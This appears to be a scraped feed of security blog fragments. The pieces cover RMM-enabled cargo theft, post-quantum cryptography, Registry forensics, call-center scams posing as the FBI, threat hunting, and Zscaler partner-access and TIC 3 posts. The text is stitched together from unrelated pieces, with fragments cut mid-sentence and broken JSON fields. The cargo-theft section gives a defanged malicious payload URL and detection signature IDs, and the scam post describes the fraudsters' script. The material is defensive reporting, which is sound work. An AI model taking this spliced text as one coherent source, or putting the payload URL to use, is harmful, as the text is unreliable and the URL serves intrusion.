attacker compromised the company via RMM delivery, deleted existing bookings and blocked dispatcher notifications, added their own device to the dispatcher\u2019s phone extension, booked loads under the compromised carrier\u2019s name, and coordinated the transport. According to the post, the initial compromise was a \u201cnextgen.Carrierbrokeragreement type of link\u201d which notably aligns with a payload URL from this cluster that Proofpoint researchers observed active in July, likely distributing ScreenConnect: hxxp://nextgen1[.]net/carrier.broker.agreement[.]html.&nbsp;&nbsp;\n\nBest practices&nbsp;\n\nOrganizations operating in the surface transportation industry or other industries at risk of cargo theft may benefit from reviewing the National Motor Freight Traffic Association Cargo Crime Reduction Framework.&nbsp;&nbsp;\n\nTo defend against RMM abuse, Proofpoint recommends the following:&nbsp;\n\n\n\tRestrict the download and installation of any RMM tooling that is not approved and confirmed by an organization\u2019s information technology administrators.&nbsp;&nbsp;&nbsp;\n\tHave network detections in place \u2013 including using the Emerging Threats ruleset \u2013 and use endpoint protection. This can alert on any network activity to RMM servers.&nbsp;&nbsp;&nbsp;\n\tDo not download and install executable files (.exe or .msi) delivered via email from external senders.&nbsp;&nbsp;\n\tTrain users to identify the activity and report suspicious activity to their security teams. This training can easily be integrated into an existing user training program.&nbsp;&nbsp;&nbsp;\n\n\nConclusion&nbsp;\n\nAccording to NICB, cargo theft losses increased 27 percent in 2024, and losses are expected to increase another 22 percent in 2025. Cargo theft is a profitable criminal enterprise, and based on Proofpoint data, cybercriminals are increasingly targeting surface transportation entities to steal real, physical goods. Proofpoint has observed nearly two dozen campaigns since August 2025 targeting such entities to deliver RMMs. Public discussion and reporting on cyber-enabled cargo theft suggests the problem is widespread, impacting organizations nationwide, and only increasing in scope and spread. Based on the growth of this activity in email threat data between 2024 and 2025, Proofpoint assesses this threat will continue to increase. Organizations should be aware of the cyber-enabled tactics and payloads used by cargo theft criminals, and implement cybersecurity measures to prevent successful exploitation.&nbsp;&nbsp;&nbsp;&nbsp;\n\nProofpoint would like to thank our colleagues at ConnectWise ScreenConnect, Red Canary, and the DFIR Report for collaborating on information sharing related to this activity.\u202f\u202f&nbsp;\n\nExample Emerging Threats signatures&nbsp;\n\n2837962\u202f\u2013 ScreenConnect - Establish Connection Attempt\u202f&nbsp;\n\n2050021 \u2013 Observed DNS Query to

      "summary": "While the rise of quantum computing lies ahead, its disruptive impact is already reshaping industries such as cybersecurity.&nbsp;Traditional cryptographic methods, while secure against classical computers, face obsolescence in a post-quantum world. As organizations evaluate their readiness for the quantum era, it is vital to first understand the cryptographic techniques used today and assess their vulnerability to quantum computers. Equally important is recognizing how quantum computing reshapes the cyber threat landscape so we can prepare for emerging attacks.&nbsp;&nbsp;This blog provides a primer on post-quantum cryptography and then covers some threat scenarios that will occur during the transition to quantum-safe algorithms. This is the first entry in a series of blogs that will help organizations prepare for the Post-Quantum Era. Future entries will cover a variety of topics:&nbsp;Post-quantum digital signatures: the ultimate cryptographic agility challengePost-quantum key exchange demystified: how it works and Zscaler\u2019s phased approach to post-quantum key exchangeCompliance mandates and how Zscaler can help organizations meet themEnabling quantum key exchange algorithms and decryption of PQC traffic on the Zero Trust ExchangeKey areas organizations should focus on for a successful transition to PQCAn Overview of Current Key Cryptographic Systems &nbsp;Cryptographic systems in cybersecurity fall into four major categories: key exchange methods, symmetric ciphers, cryptographic hash functions, and digital signatures. Below, we review these systems and whether they are post-quantum safe.Key Exchange Methods&nbsp;&nbsp;Key exchange enables secure establishment of encryption keys over potentially insecure networks. Current widely used techniques include:&nbsp;&nbsp;Elliptic Curve Diffie-Hellman Ephemeral (ECDHE): Employs elliptic curve mathematics for secure key exchange and is not post-quantum safe because it\u2019s also vulnerable to Shor's Algorithm, a quantum algorithm that fundamentally breaks the mathematical foundation of elliptic curve cryptography.Finite Field Diffie-Hellman Ephemeral (FFDHE):&nbsp;Builds upon the classical Diffie-Hellman Key Exchange mechanism above and \"ephemeral\" because temporary key pairs are used for each exchange session. The keys are calculated using arithmetic operations over a \u201cfinite field,\u201d a mathematical structure where numbers wrap around upon reaching a certain limit. Not post-quantum safe because it is also vulnerable to Shor\u2019s Algorithm.RSA (Rivest-Shamir-Adleman): An asymmetric encryption system based on factoring large integers that is not post-quantum safe: Shor's Algorithm can quickly factor its keys. Shor\u2019s Algorithm is a quantum computing algorithm designed to factorize large integers and solve the discrete logarithm problem exponentially faster than any classical approach.Symmetric Ciphers&nbsp;&nbsp;Symmetric ciphers use a single key for encryption and decryption.&nbsp;AES (Advanced Encryption Standard) is a primary example: it\u2019s a cipher that encrypts fixed-size blocks of data and is post-quantum safe. But Grover\u2019s Algorithm reduces its security efficacy requiring longer keys while not rendering it totally unusable.&nbsp;Developed by Lov Grover in 1996, his namesake algorithm offers a quantum-enabled advantage in searching unsorted databases and performing exhaustive search tasks. While not as destructive to cryptographic standards as Shor\u2019s Algorithm, Grover's Algorithm significantly reduces the efficacy of symmetric encryption and cryptographic hash functions, presenting substantial challenges in the post-quantum era. But this algorithm requires a vastly larger quantum computer in order to break RSA/EC\u2014as fantastical as it may seem, even a moon-sized quantum computer wouldn\u2019t be able to downgrade AES-128.Cryptographic Hash Functions&nbsp;Hash functions aim to securely map data of arbitrary size to fixed-size outputs. Examples include:&nbsp;&nbsp;SHA-2 (Secure Hash Algorithm): A widely used hash function for data integrity. Partially post-quantum safe as Grover's Algorithm weakens its efficacy but doesn\u2019t break it entirely.SHA-3:&nbsp; The successor to SHA-2, designed to be more cryptographically robust. Partially post-quantum safe, similarly impacted by Grover\u2019s Algorithm.Note that commonly used SHA sizes such as SHA-256 are still adequate even if Grover's Algorithm could somehow be implemented at the required scale to compromise these algorithms.&nbsp;&nbsp;Digital Signatures&nbsp;Digital signatures ensure authentication, integrity, and non-repudiation of communications. Examples include:RSA Signatures:&nbsp;Leverages RSA encryption for authentication. They are not post-quantum safe due to Shor\u2019s Algorithm.Elliptic Curve Digital Signature Algorithm (ECDSA): Authenticates messages using elliptic curve cryptography. Not post-quantum safe as elliptic curves are vulnerable to Shor\u2019s Algorithm.Edwards-curve Digital Signature Algorithm (EdDSA):&nbsp;Digital signature scheme based on elliptic curve cryptography designed to be faster than existing digital signature schemes without sacrificing security. As with ECDSA,&nbsp;this signature type is not post-quantum safe.How Quantum Computing Expands the Cyber Attack Surface&nbsp;The disruptive power of quantum computing presents significant risks for cybersecurity. \u201cQ Day\u201d is the day when fully scalable quantum computers are capable of breaking encryption\u2014market watchers expect this to occur sometime between 2030-2035. But attackers are already preparing to exploit quantum technology. Below are the primary ways quantum computing is set to expand the cyber attack surface:\"Harvest Now, Decrypt Later\" AttacksAdversaries today are intercepting encrypted information with the goal of decrypting it later, once quantum computers become viable. This strategy, often referred to as \"Harvest Now, Decrypt Later,\" is particularly concerning for organizations holding sensitive long-term data that must remain confidential for decades. Examples include intellectual property, medical and banking records, or national security secrets. Once quantum decryption becomes feasible, this data could be exposed retroactively, revealing critical information and proprietary research.Indeed, some attackers regularly hijack internet routing so they can capture and store vast volumes of data from which they later hope to extract valuable information once quantum computers are available. Public Wi-Fi is also a popular hunting ground for cybercriminals, and quantum decryption represents a huge upgrade to common man-in-the-middle (MITM) attacks. Attackers on public networks can gather encrypted data such as login credentials, credit card details, and emails with sensitive content. Once quantum computers become operational, attackers could decrypt captured traffic, exposing organizations to data breaches and phishing campaigns.Broken Digital Signatures: A Loss of Secure CommunicationsDigital signatures underpin authentication, file integrity checks, and secure communications. However, most existing digital signatures rely on mathematical problems (e.g., RSA or ECDSA) that quantum computers will render obsolete. Even before quantum computers fully materialize, attackers may begin preemptively undermining organizations by planning for a post-quantum environment where secure communications collapse completely.Quantum computers will enable bad actors to crack PKI (Public Key Infrastructure) systems, which rely on insecure key encapsulation and digital signature protocols vulnerable to quantum decryption. Once they can do this, threat actors will impersonate legitimate websites, services, or devices. For instance, attackers could forge a fake corporate website with perfect TLS certification to phish unsuspecting clients or employees.Decreased Efficacy of Symmetric Encryption and Cryptographic HashesGrover\u2019s Algorithm reduces the work factor needed to break symmetric encryption and cryptographic hashes. While AES encryption and SHA-2 remain usable by doubling key or hash lengths, these systems will require more resources to maintain the same level of security. This could result in a surge of resource-intensive encryption techniques, impacting everything from IoT devices to global communications networks.undefinedConclusion&nbsp;&nbsp;Quantum computers herald incredible potential but also introduce seismic challenges in cybersecurity. RSA, ECDHE, and digital signatures are some of the current cryptographic methods that are fundamentally unfit for a post-quantum world: they require urgent replacement with quantum-safe alternatives while new attack types emerge.&nbsp;Zscaler has been preparing for the Post-Quantum Era by supporting hybrid encryption systems, and enabling scalable integration of quantum-resilient protocols across its cloud infrastructure. As an organization, we collaborate globally with standardization bodies like NIST and are future-proofing our platform to ensure its interoperability with PQC standards\u2014all in service of accelerating our customers\u2019 journey to becoming quantum safe.In the quantum race, the cost of inaction can be high: every encrypted secret, trade secret, and private conversation risks exposure: the time to prepare for quantum cybersecurity is not in 2030\u2014it\u2019s now: stay tuned for our next installment in this series of Post-Quantum Era blogs.",

      "link": "http://windowsir.blogspot.com/2025/10/registry-analysis.html",
      "summary": "<p>First off, what is \"analysis\"? <br /><br />I submit that \"analysis\" is what happens when an examiner has investigative goals and context, and applies this, along with their knowledge and experience, to a data set. This can be anything, from a physical image of a mobile device, to a triage collection from an endpoint, to logs from a device, or various devices.&nbsp;</p><p>IMHO, this distinction is valuable, because what we often call \"analysis\" is really nothing more than parsing. For example, someone may recommend (or state as part of their process) that we open a Registry hive in a viewer, and navigate to a particular path by clicking through the UI. Now, there are ways that this could be accomplished in a much more efficient manner (I didn't say \"easier\", because the command line isn't \"easier\" for some), but in the end, looking for one value, dumping all of the values from a user's Run key is still just parsing; there's no \"analysis\" unless the investigator can articulate how this action and their finding applies to their goals.&nbsp;</p><p><b>Registry Analysis<br /></b>That being said, again...what we most often think of, or refer to as \"Registry analysis\" really amounts to nothing more than simple parsing. Few are actually conducting analysis of the files that comprise the Windows Registry, largely because the knowledge of and experience with these files is often somewhat limited. For example...and you don't need to raise your hands...but how many analysts are incorporating Registry hive file metadata into timelines? Or incorporating deleted keys and values in their overall analysis plan?</p><p>The Windows Registry includes a great deal of information related to the configuration of the endpoint, and for each user, contains information related to that user's activities. Not only does the Registry contain considerable metadata, but some of the values found within the Registry can contain valuable information regarding pre-existing states/conditions of the endpoint. For example, what we refer to as \"shellbag\" artifacts are comprised of shell items, strung together in shell item ID lists. Some of these shell items themselves contain considerable metadata, such as time stamps from folders, preserved at the time the \"shellbag\" artifacts were created.&nbsp;</p><p>Something else to consider is that very often, information stored in the Registry will persist beyond the point where applications and files are deleted/removed from the endpoint.&nbsp;</p><p>Over the years, the Windows Registry has gone through changes, but the analysis process remains the same, in part, because the binary format of the Registry remains consistent. What we traditionally refer to as \"Registry analysis\" now extends beyond \"the usual\" hive files that make up the Windows Registry, to the AmCache.hve file, as well as similarly formatted files associated with AppX packages.&nbsp;<a href=\"https://ogmini.github.io/2025/10/25/Packaged-App-Registry-Hives.html\">Ogmini's recent blog post</a> regarding Registry hives associated with AppX packages references/points to Mari's <a href=\"https://www.zerofox.com/blog/the-registry-hives-you-may-be-msix-ing-registry-redirection-with-ms-msix/\">ZeroFox blog</a> on the topic, as well as Chris's <a href=\"https://www.cybertriage.com/blog/ntuser-dat-forensics-analysis-2025/\">Cyber Triage contribution</a>, in addition to discussing sources beyond the \"traditional\" Registry.&nbsp;</p><p>As these files are of the same format, there's no reason to believe that what we learned about the traditional hive files...metadata, what constitutes a \"deleted\" key or value, etc...needs to change when it comes to these files, as well. We can parse them for keys and values, such as looking for the recently accessed documents in the AppX version of Notepad or WordPad, just as we can parse these files into a timeline.</p><p><b>Parting Thoughts</b><br />Limitations or shortcomings in knowledge and experience of individual analysts can (and does) lead to the analysis and intel \"poverty\", and the shortcomings have a cascading impact. To overcome these, we need to work together, in mentor/mentee relationships, to build better, more applicable processes that allow us to fill these gaps. Operationalizing \"corporate\" knowledge for the long term is the key to this, as knowledge is shared without the requirement for commensurate experience.&nbsp;</p>",

I actually wrote a longer piece for LinkedIn about this type of advertisement about six months ago.&nbsp; See: \"<a href=\"https://www.linkedin.com/posts/garwarner_facebook-ads-lead-to-call-center-scams-activity-7321211499748749313-uhRc?utm_source=share&amp;utm_medium=member_desktop&amp;rcm=ACoAAABrrHABriF_d4eU6ILcCymCe1lnozPdSbE\">Dangerous Facebook Ads and Call Center Scams</a>\" on my LinkedIn page.&nbsp; In this case, the \"vendor\" who is providing the Facebook Ads portion of this scam is almost certainly operating from Vietnam.&nbsp; Crime is global.&nbsp; Who knew?<br /><br />Clicking the ad, in the incident that I experience on October 17, 2025, led to exactly the same next steps as the ones I reported on April 24, 2025.&nbsp;&nbsp;<p></p><p><table align=\"center\" cellpadding=\"0\" cellspacing=\"0\" class=\"tr-caption-container\" style=\"margin-left: auto;

I wrote about it in my post \"<a href=\"https://garwarner.blogspot.com/2025/09/indian-call-center-scammers-partner.html\">Indian Call Center Scammers Partner with Chinese Money Launderers</a>\" on this blog. Following Pierogi's lead, I answered the scammers questions as if I were a retiree.&nbsp; (Don't let the grey beard fool you, I'm not!)&nbsp;<br /><br />The first thing the scammers had me do was to power off my computer. (I was playing an MP3 of their scam audio so they believed I was still on their \"lock screen.\")&nbsp;</div><div><br /></div><div>They asked me \"Is this your own computer? or a work computer?\"&nbsp; I answered \"Work computer? Heavens no!&nbsp; I haven't worked in years!\"&nbsp;</div><div><br /></div><div>Then they asked me \"Do you know what an IP address is?\"&nbsp; I answered \"No, I've never heard of an IT address, but my grandson works in IT ... is this related to him?\"&nbsp;</div><div><br /></div><div>They gave me a very poor explanation of what an IP address is and then asked who my Internet carrier was.&nbsp; I lied and told them a carrier that doesn't even offer services in my area. They \"put me on a brief hold\" during which I could hear people talking in Hindi to one another.&nbsp; Then they came back and said \"Yes, I see that your IP address is under investigation by (imaginary carrier)!\"&nbsp;<br /><br />Then they asked me where I banked (I lied again) and whether I had an investment account (I lied again.) After putting me on another hold, they came back and said that my bank account was also under investigation.&nbsp; After a few minutes, they came back and said (in a very grave voice) that unfortunately, I was under suspicion for distributing \"child pornography\" (an obsolete and inappropriate term for Child Sexual Abuse Materials). Unfortunately, they had no choice but to turn this matter over to the FBI.&nbsp; Please hold as they were going to transfer me to the FBI Agent then.<br /><br />As I denied having any involvement in CSAM materials, the FBI Agent very sternly yelled at me and asked me for my ZIP Code.&nbsp;<br /><br />Unfortunately I had a meeting to attend about then, so I disengaged, but I know the rest of that script.&nbsp; The ZIP Code is so that they can look up the address of the nearest Bitcoin ATM from my house.&nbsp;<br /><br />This is the BEGINNING of what happened to \"the Ontario Couple\" (only of course they were speaking to a Royal Canadian Mounted Police Agent, rather than an FBI Agent.)</div><div><br /></div><div>We have assisted in several of these cases -- twice involving the elderly relatives of my own students -- who were convinced over the course of many phone calls over many days -- that they needed to withdraw their cash from the bank, and in one case, put the cash in an overnight delivery box and ship it to a CVS store in the Chicago area.&nbsp;</div><div><br /></div><div>Why would they do that?&nbsp; Because the FBI, convinced of their innocence, had asked their permission to use their bank account for a \"sting\" against a Mexican Drug Cartel. The \"FBI Agent\" in one case made them take an imaginary oath, similar to the oath one would take when being sworn into military service, that as part of the FBI's Undercover Operation, they were not allowed to speak to anyone about their secret mission.&nbsp; Doing so would result in them being arrested and charged with Obstruction of Justice.</div><div><br /></div><div>So when the bank says \"Why are you withdrawing this money?\" and they reply \"Because I've decided to invest in Gold Bars\" they are not \"ignoring the warning of the bank\" they are \"following their orders as a sworn undercover agent assisting the FBI in breaking up a drug cartel!\"&nbsp; In the Ontario couple's case, the psychological oppression and manipulation continued for FIVE MONTHS as they had their money slowly stolen by a TransNational Organized Crime group who has perfected the art of manipulation.&nbsp;</div><div><br /></div><div>And in that scenario, the Daily Mail and CTV want to broadcast that these fools gave their money away to criminals despite the bank's warning and they want YOU to believe that is what happened.&nbsp;&nbsp;</div><div><br /></div><div>Shame on them!</div><h2 style=\"text-align: left;\">Illicit Call Centers: Crime-As-A-Service (via Facebook)</h2><p>How do these types of crimes begin?&nbsp; To understand, it is necessary to start taking apart the illicit call center Crime-as-a-Service model that operates via Facebook Groups.&nbsp; We've been talking about these for nearly a decade now and they are more active now than ever before.&nbsp;<br /><br />Here's an example of a scammer boasting that he offers calls on a \"Pay Per Call\" model for a variety of fraud types.&nbsp; Facebook, Blue Screen of Death, Amazon, and PayPal. His point in sharing the Call Duration is to indicate that his calls are \"sticky.\" That is, they are likely to have a long enough conversation to \"sink the hook.\"&nbsp; Calls from 1308 seconds (21 minutes) to 4765 seconds (79 minutes!) are likely to have been believable enough that there is time to have taken the scam to a financially rewarding level.&nbsp;<br /><br /></p><div class=\"separator\" style=\"clear: both;

      "title": "Understanding the Threat Hunting Lifecycle",
      "link": "https://www.zscaler.com/blogs/product-insights/understanding-threat-hunting-lifecycle",
      "summary": "Hunting traditional bad guys depends on traditional evidence. They're out in the world, leaving traces\u2014witnesses, footprints, fingerprints. Cybercriminals, on the other hand, can be virtually invisible. They have no face to sketch, no witnesses, and only the faintest of trails to follow.And that means by the time you notice something out of place, it's often too late to stop the attack.You can't effectively defend your critical assets against today's fast, stealthy adversaries by chasing after them. Instead, you need a proactive defense strategy, including continuous monitoring, threat intelligence, and robust incident investigation and response. This is where threat hunting comes in: a well-structured threat hunting lifecycle helps you uncover unseen risks, prepare for unknown threats, and&nbsp;boost your overall defense.What is threat hunting?Threat hunting is a hands-on, proactive process that looks for threats hiding in your network. Unlike threat detection, which responds to specific triggers, threat hunting can start with something as small as a hunch that something isn't quite right, and kick off an investigation into the shadowy places detection tends to miss. The goal is to keep you ahead of attackers, instead of a step behind.Threat hunting vs. threat detection\"Ahead\" is the operative word here. The difference between threat hunting and threat detection is in how they approach\u2014or don't approach\u2014threats. Threat detection is reactive, using automated systems to flag known indicators of compromise (IOCs) and behavioral anomalies.Threat hunting, on the other hand, is proactive. It involves actively searching for threats and weak points that evade automated systems. A threat hunting team is like a squad of elite guards trained to spot the earliest, subtlest warning signs of an impending attack, and stop it before it starts.Why proactive threat hunting mattersPutting on sunscreen is easier than treating a bad sunburn. Getting an oil change is cheaper than having your engine replaced. By that same token, adopting a proactive threat hunting strategy helps you:Prevent threats from escalating. Cyberthreat hunters spot risks before they grow into breaches, ransomware attacks, insider threats, and more. Early detection gives you the edge you need to stop an attack before damage is done.Speed up incident response times. Threat hunting combines human skill with automation, enabling your security team to more quickly investigate and verify threats. This gives threat actors less time inside your environment for reconnaissance, creating backdoors, etc.Protect your reputation and bottom line. A single breach cost the victim organization an average US$4.44 million last year, according to IBM and Ponemon. That includes fines, lost customers, and more, and it's astronomically higher than the cost of proactive threat hunting.Improve your overall defenses. Finding well-hidden threats and weak spots helps you refine your strategies and procedures to increase your security posture over time.Improvement over time might be one of the more easily overlooked benefits, but in the long run, it's one of the most important. That\u2019s why it's right at the heart of the threat hunting lifecycle.What is a threat hunting lifecycle?A threat hunting lifecycle is an iterative approach that helps teams continually streamline and enrich their efforts for better and better results. It's a framework that guides hunting processes from beginning to end, and then starts all over.Threat hunting methodologies vary greatly, so there's no single, definitive threat hunting lifecycle. Still, most approaches share a core set of basic steps:1. Collect and analyze high-quality data from across the organization.Good insights only come from good data. This includes network logs, endpoint activity reports, user behavior, and external&nbsp;threat intelligence feeds. Specialized tools like behavioral analytics can help establish a baseline for normal activity from which to draw further insights.2. Develop a hypothesis about where a threat might exist.From the baseline, threat hunters can identify deviations that could signal impending attacks. For example, they might study logins outside normal business hours or unusual patterns of data transfers. Creativity and critical thinking are key here\u2014qualities automated systems don't have.3. Investigate and validate the hypothesis.Threat hunters search for evidence: signs of malware, abnormal traffic, unauthorized access, and so on. Crucially, they also verify that these are real threats, not false positives. That way, they spend more time addressing true risks, instead of chasing down impossible travel errors.4. Continuously improve the entire process.Every hunt generates insights, even if it ultimately doesn't find a real threat. These insights help organizations tweak tools and adjust their approaches. This way, processes gradually get faster, techniques get sharper, and defenses grow stronger.Our threat hunting methodologyThat's what threat hunting looks like in theory. But what does it look like in practice? First, let me provide a little context.At Zscaler, we know the best signals power the best response. Our&nbsp;zero trust platform inspects all traffic between users, resources, and destinations. We collect, correlate, and monitor signals across our entire global install base\u2014sourced from 500+ billion transactions each day. That massive data set gives us powerful telemetry our threat hunters can use to identify and defend against the latest threats, exploits, and attack tactics.Merging zero trust principles, threat intelligence, hypothesis testing, and proven playbooks enables us to hunt threats rapidly and accurately. And we bring it all together by blending human expertise with advanced AI and automation. We call our approach TRACER.Here\u2019s how the TRACER model works:Telemetry: Our platform's 500+ billion daily transactions give our hunters unrivaled visibility into real-time data on traffic patterns and emerging threats.Refine: Our hunters enrich that data with high-quality threat intelligence and AI-assisted tooling, highlighting areas that warrant further exploration.Analyze: Our global team investigates leads 24/7, performing structured, unstructured, and situational hunting based on available IOCs and anomalies.Context: Our analysts correlate their findings with intelligence from external data sources to build clear, actionable insights.Escalate: Threat hunting alerts with rich context are immediately sent to the security operations center/incident response team.Revise: The team documents methods and outcomes and refines playbooks to improve the efficiency and efficacy of future hunts.&nbsp;&nbsp;Putting proactive threat hunting to workWith today's threats stealthier, faster, and hitting harder than ever, adopting proactive threat hunting is just a matter of having the right tool for the job. Highly skilled attackers call for highly skilled defenders, full stop. That being said, let's take a moment for a reality check.The biggest hurdle is this: many organizations, even those with a separate security team distinct from IT, simply don't have the resources for a dedicated threat hunting team. Sufficiently skilled experts are tough to hire, and the salaries and security tools necessary to maintain a team are prohibitively costly. It sounds like a lose-lose situation: stretch your wallet paying for your own hunting team, or break the bank recovering from attacks.But there's a third option: managed threat hunting.With a managed threat hunting service, you get all the expertise, threat intelligence, and 24/7 operations at a lower, predictable cost. Results are fast, and it's easy to scale without the need to hire, train, and equip an in\u2011house team.How Zscaler Threat Hunting can helpZscaler Managed Threat Hunting provides a team of experts who work around the clock to uncover hidden signs of potential threats. Armed with our proven TRACER methodology and sophisticated machine learning models, Our Managed Threat Hunting service helps you:Hunt and disrupt advanced threats: Leverage the expertise of our human-driven hunt team to detect and neutralize emerging and advanced persistent threats (APTs).Reduce alert fatigue: Let our 24/7 hunt team and proprietary tooling distill billions of transactions into context-rich alerts and actionable insights, freeing up your team to focus on critical tasks.Stop threats earlier: Detect and disrupt attacks earlier in the kill chain by analyzing web traffic instead of waiting for endpoint-based indicators of compromise.Access tailored threat hunting support: Upgrade to Advanced service for personalized onboarding, strategic briefings, tactical reports, and ongoing, customized threat hunting expertise.Start building your threat hunting strategy today to stop advanced threats tomorrow.

In the last 12 months, fraudsters have used advanced AI tools to create more convincing schemes, resulting in over $400 billion in stolen funds globally.<strong><a href=\"http://feeds.feedburner.com/GoogleOnlineSecurityBlog#fn1\" id=\"fnref1\">\u00b9</a></strong>\n</p>\n<p>\nFor years, Android has been on the frontlines in the battle against scammers, using the best of Google AI to build proactive, multi-layered protections that can anticipate and block scams before they reach you. Android\u2019s scam defenses protect users around the world from over 10 billion suspected malicious calls and messages every month<strong><sup><a href=\"http://feeds.feedburner.com/GoogleOnlineSecurityBlog#fn2\" id=\"fnref2\">2</a></sup></strong>. In addition, Google continuously performs safety checks to maintain the integrity of the RCS service. In the past month alone, this ongoing process blocked over 100 million suspicious numbers from using RCS, stopping potential scams before they could even be sent. \n</p>\n<p>\nTo show how our scam protections work in the real world, we asked users and independent security experts to compare how well Android and iOS protect you from these threats.

      "summary": "How much would you trust your partner or supplier organization\u2019s security?Every site-to-site VPN connection you establish is an answer to that question.For decades, the default has been network-to-network trust, using firewalls and tunnels that flatten your network and expand the blast radius of any incident. With this architecture, you are implicitly trusting your partner\u2019s patching cadence, firewall rules, and overall security posture.But where you see a business partnership, a sophisticated adversary sees an attack superhighway leading directly into your network. This outdated model is complex, costly, and creates an unacceptable level of risk.It\u2019s time to&nbsp;transform business partner connectivity and&nbsp;adopt a new model based on zero trust.Problem #1: Unacceptable Security Risk&nbsp;Site-to-site VPNs were built for a different era\u2014one of trusted networks and defined perimeters. Their primary goal was to establish reliable connectivity, not to enforce granular secure access. This fundamental design flaw creates unacceptable risks in a zero trust world. Trusted connections act as digital superhighways. Once the tunnel is up, the two networks effectively become one, creating a flat, attackable surface. This is where the danger lies.Expanded Attack SurfaceWhen organizations establish a site-to-site VPN, they are creating network-level trust zones. This means the attack surface is no longer just the organization\u2019s own infrastructure; it now includes the network of every partner you connect to. An attacker who compromises a partner device can use that trusted tunnel as an attack superhighway directly into your environment. They can move laterally, scan for vulnerable internal servers, and seek out high-value targets like databases and domain controllers.&nbsp;&nbsp;Problem #2: The Operational NightmareTraditional network-based solutions necessitate manual configuration and management of multiple IPsec tunnels for each business partner, leading to significant complexity in managing virtual routing and forwarding (VRF) aware DNS settings. Custom DNS configurations are required for each partner's application, and VRF must be accurately set up to prevent IP address overlaps. This results in a heavy operational burden, with each partner needing an isolated routing and DNS framework. Consequently, scaling and maintaining the infrastructure becomes resource-intensive, hindering agility and operational efficiency.Extending VPNs to business partners\u2019 networks demands significant effort in scaling and maintenance, including redundant tunnels, manual configuration of failover, and constant monitoring to ensure uptime. As more partners are onboarded, management of these tunnels becomes increasingly complex. Ensuring high availability in such an environment requires extensive planning, increased operational overhead, and a heavy reliance on redundant infrastructure, which can be costly and difficult to manage effectively.For the networking and security teams, the problems multiply:Zero Visibility:&nbsp;Lose sight of who is accessing what with fragmented logging and weak session attribution.Operational Burden:&nbsp;Drown the teams in IP address management, brittle firewall rules, and endless hardware scaling.M&amp;A Paralysis: For mergers and acquisitions, the pain is acute. Weeks or even months are lost establishing these risky links and solving for overlapping IP address spaces. Simply put, legacy connectivity kills business agility.The Zero Trust Alternative: ZPA B2B Extranet ConnectivityThere is a better way. Zscaler introduced Extranet Application Support&nbsp;to solve this problem by bringing foundational zero trust principles to partner connectivity. Instead of connecting networks, we connect authorized entities directly and only to the applications they need. Every single session is authorized, inspected, and logged before any traffic moves.The initial release of this feature was a game-changer, allowing customers to give their users secure access to applications hosted in partner environments without requiring risky site-to-site VPNs.Now, with bi-directional extranet support, the model extends both ways:Customers can reach partner workloads securely.Partners can reach customer workloads securely.All this is achieved without ever exposing networks, managing complex firewall rules, or trading in dangerous implicit trust.Bi-directional extranet support with Zscaler Private Access gives IT and security teams what they need most:Visibility: Every transaction is logged, and every flow is inspectable in a single console.Control: Every session is tied to a granular, identity-based policy.Agility: Onboard a new partner in hours or days, not weeks or months.Resiliency: Tunnels terminate in the global Zscaler cloud, which provides built-in redundancy and scale.Use Case 1: An Organization Accessing Partner ApplicationsOrganizations often need their own employees or internal workloads to access applications hosted and managed by a partner. With ZPA Extranet Connectivity, this is simple and secure.Employees use the Zscaler Client Connector (ZCC) or browser-based access to reach partner apps, with identity, device posture, and policy determining what\u2019s allowed.OT and device management teams can use privileged remote access workflows to manage partner-hosted infrastructure without opening risky network tunnels.Workloads (in branches, clouds, or data centers) can make API calls to partner services directly without any network peering.Examples in Action:Healthcare: A hospital\u2019s clinicians securely access lab reporting portals hosted by external diagnostic vendors, with no direct network connection between the two organizations.IT Services: Outsourcing teams connect to client-hosted build systems or test environments without needing to manage cumbersome VPN clients or be placed on the client's network.Use Case 2: Partners Accessing Organization\u2019s ApplicationsJust as importantly, business partners need to reach applications inside your environment. Traditionally, this meant granting them a hole in the firewall\u2014a dangerous assumption of trust. With ZPA Extranet Connectivity, you are in complete control.Least-Privilege Access: Partners can only access the specific applications you publish to them\u2014and nothing else on your network.Always-On Inspection: All inbound traffic to DC applications can be fully inspected using ZIA\u2019s SWG capabilities.No Network Exposure: You never expose your internal DNS or IP addresses. Zscaler provides a DNS Forwarder, completely hiding the real IP and location of the application.Unified Logging: Every transaction is centrally logged, eliminating the blind spots inherent in traditional extranets. Each new partner connection is simply an additional policy rule, not a new IPsec tunnel to build and manage.Examples in Action:Manufacturing: Logistics providers are granted secure access to update order management systems hosted in the manufacturer\u2019s data center, without any visibility into other corporate resources.Retail: Payment processors and franchise systems connect to HQ-hosted financial apps without being placed on the corporate network.In Conclusion: A New Era for Business Partner ConnectivitySite-to-site VPNs flatten networks and create implicit trust. ZPA Extranet Application Support enforces strict, application-only access. By extending zero trust to partner connectivity\u2014in both directions\u2014Zscaler delivers the agility your business needs without sacrificing the security it demands.Whether you\u2019re navigating an M&amp;A, scaling supply chain integrations, or modernizing all your B2B connectivity, now is the time to leave legacy VPNs and their inherent risks behind.Take the&nbsp;self-guided product tour to experience firsthand how you can easily deploy ZPA and set-up extranet connectivity to your business partners.Ready to chat?&nbsp;Sign up now and our product experts will connect with you to discuss how ZPA Extranet Connectivity can transform your organization\u2019s business partner connectivity!",

      "summary": "As someone who has spent decades in federal IT cybersecurity\u2014most notably at CISA, where I had the chance to lead the TIC 3 initiative\u2014my career has been a front-row seat to the evolving challenges federal agencies face in keeping networks secure. Despite rapid advancements, the gaps between outdated legacy infrastructure and the shape of modern cybersecurity have remained all too obvious. For military and veteran health IT professionals, the stakes are even higher: the challenge is not only to secure critical government data but to do so while maintaining an unwavering focus on mission resilience and public service.It was with these challenges in mind that we designed the Trusted Internet Connections 3 (TIC 3) framework. Since rolling it out, I\u2019ve seen firsthand how this architecture is transforming how federal agencies protect their systems while seamlessly advancing their missions. Let me walk you through how TIC 3 is changing the game, highlight lessons learned along the way, and illustrate one agency\u2019s journey through this complex but rewarding transformation.The Desperate Need for ChangeIn the mid-2000s, when the White House initiated a data call to assess agencies' external internet connections, the outcome was startling: agencies reported over 4,000 individual connections. This degree of sprawl reflected a fragmented cybersecurity environment, where security protocols and technologies varied widely from agency to agency. The numbers immediately raised red flags, and the government acted quickly to develop the first wave of the Trusted Internet Connections framework\u2014TIC 1.TIC 2 expanded upon these measures in 2012 by instituting stronger, centralized controls through fixed access points. However, the solution introduced its own set of constraints. TIC 2 created what many industry experts call the \"TIC Tax\"\u2014a bottleneck effect, where agencies had to route traffic through a small number of access points, often located on the East Coast. This caused latency and operational inefficiency, particularly for remote offices and mobile users. To compound the issue, TIC 2 